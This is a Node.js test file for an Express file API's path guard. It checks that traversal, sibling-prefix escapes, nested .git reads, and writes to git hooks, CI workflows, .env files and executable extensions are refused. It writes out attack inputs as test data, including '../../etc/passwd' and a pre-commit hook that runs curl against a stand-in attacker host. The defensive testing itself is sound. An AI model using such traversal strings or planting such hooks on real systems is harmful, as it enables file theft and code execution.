const { test, before, after } = require('node:test');
const assert = require('node:assert');
const express = require('express');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { createFilesRouter } = require('./files');

// A project laid out to exercise the two escapes the old startsWith checks
// allowed: a sibling directory whose name EXTENDS the base, and a nested
// sensitive directory that a first-segment-only prefix test never looked at.
let tmpRoot, projectRoot, docsPath, server, baseUrl, watcher;

before(async () => {
  tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'bs-files-'));
  projectRoot = path.join(tmpRoot, 'proj');
  docsPath = path.join(projectRoot, 'docs');
  fs.mkdirSync(docsPath, { recursive: true });
  fs.writeFileSync(path.join(docsPath, 'spec.md'), '# spec');

  // Sibling of docsPath whose name extends it: /proj/docs-private
  fs.mkdirSync(path.join(projectRoot, 'docs-private'));
  fs.writeFileSync(path.join(projectRoot, 'docs-private', 'secret.md'), 'SECRET');

  // Sibling of projectRoot whose name extends it: /tmp/proj-backup
  fs.mkdirSync(path.join(tmpRoot, 'proj-backup'));
  fs.writeFileSync(path.join(tmpRoot, 'proj-backup', 'secret.md'), 'SECRET');

  fs.mkdirSync(path.join(projectRoot, '.git', 'hooks'), { recursive: true });
  fs.mkdirSync(path.join(docsPath, '.git'), { recursive: true });
  fs.writeFileSync(path.join(docsPath, '.git', 'config.md'), 'nested');

  const built = createFilesRouter({ docsPath, projectRoot }, () => {});
  watcher = built.watcher;
  const app = express();
  app.use(express.json());
  app.use('/api', built.router);
  server = app.listen(0);
  await new Promise((r) => server.once('listening', r));
  baseUrl = `http://127.0.0.1:${server.address().port}`;
});

after(async () => {
  if (watcher) await watcher.close();
  if (server) server.close();
  fs.rmSync(tmpRoot, { recursive: true, force: true });
});

const get = (p) => fetch(`${baseUrl}/api/file?path=${encodeURIComponent(p)}`);
const put = (p, content) =>
  fetch(`${baseUrl}/api/file`, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ path: p, content }),
  });

test('a real docs file still reads', async () => {
  const res = await get('spec.md');
  assert.strictEqual(res.status, 200);
  assert.strictEqual((await res.json()).content, '# spec');
});

test('GET refuses a sibling directory that merely extends projectRoot', async () => {
  // ../proj-backup/secret.md resolves to a path that startsWith('/tmp/.../proj')
  const res = await get('../proj-backup/secret.md');
  assert.strictEqual(res.status, 403);
});

test('GET refuses a sibling that merely extends docsPath', async () => {
  // This is the docs-branch half of the prefix bug: resolved against docsPath,
  // '../docs-private/secret.md' lands on /proj/docs-private/secret.md, which
  // startsWith('/proj/docs') accepted. It must now be refused — and the
  // projectRoot fallback must not rescue it either, since relative to
  // projectRoot the same string points outside the project entirely.
  const res = await get('../docs-private/secret.md');
  assert.strictEqual(res.status, 403);
});

test('the same file is still readable by its honest path', async () => {
  // Guards against "fixed" meaning "broke the legitimate case": docs-private/
  // really is inside the project, so naming it from projectRoot works.
  const res = await get('docs-private/secret.md');
  assert.strictEqual(res.status, 200);
  assert.strictEqual((await res.json()).content, 'SECRET');
});

test('GET refuses a nested .git, not just a top-level one', async () => {
  // The old first-segment prefix test only saw '.git' at position 0.
  const res = await get('.git/config.md');
  assert.strictEqual(res.status, 403);
});

test('GET refuses classic traversal out of the project', async () => {
  const res = await get('../../etc/passwd');
  assert.strictEqual(res.status, 403);
});

test('PUT writes a normal doc', async () => {
  const res = await put('docs/new.md', 'hello');
  assert.strictEqual(res.status, 200);
  assert.strictEqual(fs.readFileSync(path.join(docsPath, 'new.md'), 'utf8'), 'hello');
});

test('PUT refuses to write a git hook', async () => {
  // The finding that mattered: this passed the old guard, since .git IS inside
  // projectRoot and the write path had no directory blocklist at all.
  const res = await put('.git/hooks/pre-commit', '#!/bin/sh\ncurl evil.example');
  assert.strictEqual(res.status, 403);
  assert.strictEqual(fs.existsSync(path.join(projectRoot, '.git', 'hooks', 'pre-commit')), false);
});

test('PUT refuses a CI workflow and an agent command file', async () => {
  assert.strictEqual((await put('.github/workflows/ci.md', 'x')).status, 403);
  assert.strictEqual((await put('.claude/commands/architect.md', 'x')).status, 403);
});

test('PUT refuses .env and its variants', async () => {
  assert.strictEqual((await put('.env', 'KEY=1')).status, 403);
  assert.strictEqual((await put('.env.local', 'KEY=1')).status, 403);
});

test('PUT refuses an executable extension', async () => {
  assert.strictEqual((await put('docs/payload.js', 'process.exit()')).status, 403);
  assert.strictEqual(fs.existsSync(path.join(docsPath, 'payload.js')), false);
});

test('PUT refuses to escape the project by prefix or traversal', async () => {
  assert.strictEqual((await put('../proj-backup/owned.md', 'x')).status, 403);
  assert.strictEqual((await put('../../owned.md', 'x')).status, 403);
  assert.strictEqual(fs.existsSync(path.join(tmpRoot, 'proj-backup', 'owned.md')), false);
});
